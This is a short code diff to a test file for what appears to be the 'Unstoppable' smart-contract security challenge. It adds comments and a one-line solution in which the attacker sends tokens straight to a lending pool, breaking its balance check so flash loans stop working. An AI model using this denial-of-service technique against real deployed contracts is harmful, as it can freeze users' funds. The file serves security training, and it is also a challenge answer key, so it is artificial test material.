@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // on this.token:
+        // using transfer() instead of depositTokens() -> poolBalance = poolBalance.add(amount); is not trigger
+        // then, inside function flashloan:
+        //    assert(poolBalance == balanceBefore); // is now false
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
